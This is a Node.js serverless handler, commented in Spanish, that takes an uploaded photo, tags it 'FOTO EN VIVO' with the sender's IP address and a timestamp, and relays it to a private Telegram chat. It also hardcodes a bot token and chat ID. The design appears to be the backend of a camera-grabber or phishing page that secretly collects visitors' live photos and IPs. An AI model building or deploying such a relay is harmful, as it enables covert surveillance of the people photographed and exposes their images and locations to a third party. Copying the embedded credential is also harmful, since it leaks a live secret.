const formidable = require('formidable');

// Función para enviar foto a Telegram
async function sendPhotoToTelegram(photoBuffer, caption, ip) {
  const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '7532643566:AAF7Qyz0jYP0ck20RJdFyZNe1L9fETFU-IM';
  const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '12075234';
  
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.log('ERROR: Telegram no configurado');
    return false;
  }

  try {
    // Crear multipart/form-data manualmente para la foto
    const boundary = '----WebKitFormBoundary' + Math.random().toString(16).substr(2);
    const photoFileName = `photo_${Date.now()}_${ip.replace(/[:.]/g, '-')}.jpg`;
    
    // Construir el cuerpo multipart
    let body = '';
    
    // Chat ID
    body += `--${boundary}\r\n`;
    body += `Content-Disposition: form-data; name="chat_id"\r\n\r\n`;
    body += `${TELEGRAM_CHAT_ID}\r\n`;
    
    // Caption
    body += `--${boundary}\r\n`;
    body += `Content-Disposition: form-data; name="caption"\r\n\r\n`;
    body += `${caption}\r\n`;
    
    // Photo file
    body += `--${boundary}\r\n`;
    body += `Content-Disposition: form-data; name="photo"; filename="${photoFileName}"\r\n`;
    body += `Content-Type: image/jpeg\r\n\r\n`;
    
    // Crear el buffer final
    const preBuffer = Buffer.from(body, 'utf8');
    const postBuffer = Buffer.from(`\r\n--${boundary}--\r\n`, 'utf8');
    const finalBuffer = Buffer.concat([preBuffer, photoBuffer, postBuffer]);
    
    const photoResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
      method: 'POST',
      headers: {
        'Content-Type': `multipart/form-data; boundary=${boundary}`,
        'Content-Length': finalBuffer.length.toString()
      },
      body: finalBuffer
    });

    const photoResult = await photoResponse.json();

    if (photoResponse.ok) {
      console.log('📸 Foto enviada a Telegram');
      return true;
    } else {
      console.log('❌ Error enviando foto:', photoResult.description);
      return false;
    }
  } catch (error) {
    console.error('❌ Error crítico enviando foto:', error);
    return false;
  }
}

module.exports = async (req, res) => {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    // Obtener IP del usuario
    const ip = req.headers['x-forwarded-for'] || 
               req.headers['x-real-ip'] || 
               req.connection.remoteAddress ||
               'unknown';
               
    const timestamp = new Date().toLocaleString('es-ES', { timeZone: 'Europe/Madrid' });

    // Parsear la foto usando formidable
    const form = formidable({
      maxFileSize: 10 * 1024 * 1024, // 10MB max para fotos
      keepExtensions: true
    });

    const [fields, files] = await form.parse(req);
    
    if (!files.photo || !files.photo[0]) {
      return res.status(400).json({ status: 'error', message: 'No photo file received' });
    }

    const photoFile = files.photo[0];
    const photoBuffer = require('fs').readFileSync(photoFile.filepath);
    const fileSize = (photoFile.size / 1024).toFixed(2); // KB

    // Información adicional si está disponible
    let deviceInfo = {};
    if (fields.deviceInfo && fields.deviceInfo[0]) {
      try {
        deviceInfo = JSON.parse(fields.deviceInfo[0]);
      } catch (e) {
        console.log('Error parsing device info');
      }
    }

    // Crear caption para la foto
    const caption = `📸 FOTO EN VIVO - ${timestamp}
📍 IP: ${ip}
📊 ${fileSize}KB`;

    // Enviar a Telegram
    const telegramSent = await sendPhotoToTelegram(photoBuffer, caption, ip);

    // Log
    console.log(`[${timestamp}] PHOTO_SENT from ${ip} - Size: ${fileSize}KB - Telegram: ${telegramSent ? 'SENT' : 'FAILED'}`);

    res.json({ 
      status: 'success', 
      message: telegramSent ? 'Foto enviada a Telegram' : 'Error enviando foto',
      telegramSent: telegramSent,
      timestamp: timestamp
    });

  } catch (error) {
    console.error('Error processing photo:', error);
    res.status(500).json({ status: 'error', message: 'Error processing photo' });
  }
}; 